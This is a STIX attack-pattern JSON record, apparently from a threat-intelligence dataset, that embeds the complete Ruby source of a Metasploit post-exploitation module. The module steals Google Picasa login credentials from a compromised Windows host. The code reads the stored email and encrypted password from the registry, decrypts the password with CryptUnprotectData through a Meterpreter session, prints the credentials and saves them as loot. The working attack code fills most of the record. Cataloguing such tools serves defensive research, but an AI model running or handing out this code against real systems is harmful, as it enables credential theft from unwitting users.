{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0ced2859-0a48-4861-908d-2e2227a70f98",
    "created": "2024-08-14T16:33:08.232055Z",
    "modified": "2024-08-14T16:33:08.23206Z",
    "name": "Windows Gather Google Picasa Password Extractor",
    "description": " This module extracts and decrypts the login passwords stored by Google Picasa.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/enum_picasa_pwds.rb",
            "external_id": "enum_picasa_pwds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Priv\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Google Picasa Password Extractor',\n        'Description' => %q{\n          This module extracts and decrypts the login passwords\n          stored by Google Picasa.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Unknown', # SecurityXploded Team, www.SecurityXploded.com\n          'Sil3ntDre4m <sil3ntdre4m[at]gmail.com>',\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_config_getuid\n              stdapi_sys_process_attach\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def prepare_railgun\n    if !session.railgun.get_dll('crypt32')\n      session.railgun.add_dll('crypt32')\n    end\n  end\n\n  def decrypt_password(data)\n    pid = client.sys.process.getpid\n    process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)\n\n    mem = process.memory.allocate(512)\n    process.memory.write(mem, data)\n\n    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'\n      addr = [mem].pack('V')\n      len = [data.length].pack('V')\n      ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, nil, nil, nil, 0, 8)\n      len, addr = ret['pDataOut'].unpack('V2')\n    else\n      addr = [mem].pack('Q')\n      len = [data.length].pack('Q')\n      ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, nil, nil, nil, 0, 16)\n      len, addr = ret['pDataOut'].unpack('Q2')\n    end\n\n    return '' if len == 0\n\n    decrypted_pw = process.memory.read(addr, len)\n    return decrypted_pw\n  end\n\n  def get_registry\n    print_status('Looking in registry for stored login passwords by Picasa ...')\n\n    username = registry_getvaldata('HKCU\\\\Software\\\\Google\\\\Picasa\\\\Picasa2\\\\Preferences\\\\', 'GaiaEmail') || ''\n    password = registry_getvaldata('HKCU\\\\Software\\\\Google\\\\Picasa\\\\Picasa2\\\\Preferences\\\\', 'GaiaPass') || ''\n\n    credentials = Rex::Text::Table.new(\n      'Header' => 'Picasa Credentials',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'User',\n        'Password'\n      ]\n    )\n\n    foundcreds = 0\n    if !username.empty? && !password.empty?\n      passbin = [password].pack('H*')\n      pass = decrypt_password(passbin)\n\n      if pass && !pass.empty?\n        print_status('Found Picasa 2 credentials.')\n        print_good(\"Username: #{username}\\t Password: #{pass}\")\n\n        foundcreds = 1\n        credentials << [username, pass]\n      end\n    end\n\n    # For early versions of Picasa3\n    username = registry_getvaldata('HKCU\\\\Software\\\\Google\\\\Picasa\\\\Picasa3\\\\Preferences\\\\', 'GaiaEmail') || ''\n    password = registry_getvaldata('HKCU\\\\Software\\\\Google\\\\Picasa\\\\Picasa3\\\\Preferences\\\\', 'GaiaPass') || ''\n\n    if !username.empty? && !password.empty?\n      passbin = [password].pack('H*')\n      pass = decrypt_password(passbin)\n\n      if pass && !pass.empty?\n        print_status('Found Picasa 3 credentials.')\n        print_good(\"Username: #{username}\\t Password: #{pass}\")\n\n        foundcreds = 1\n        credentials << [username, pass]\n      end\n    end\n\n    if foundcreds == 1\n      path = store_loot(\n        'picasa.creds',\n        'text/csv',\n        session,\n        credentials.to_csv,\n        'decrypted_picasa_data.csv',\n        'Decrypted Picasa Passwords'\n      )\n\n      print_status(\"Decrypted passwords saved in: #{path}\")\n    else\n      print_status('No Picasa credentials found.')\n    end\n  rescue ::Exception => e\n    print_error(\"An error has occurred: #{e}\")\n  end\n\n  def run\n    uid = session.sys.config.getuid  # Decryption only works in context of user's account.\n\n    if is_system?\n      print_error(\"This module is running under #{uid}.\")\n      print_error('Automatic decryption will not be possible.')\n      print_error('Migrate to a user process to achieve successful decryption (e.g. explorer.exe).')\n    else\n      prepare_railgun\n      get_registry\n    end\n\n    print_status('Done')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}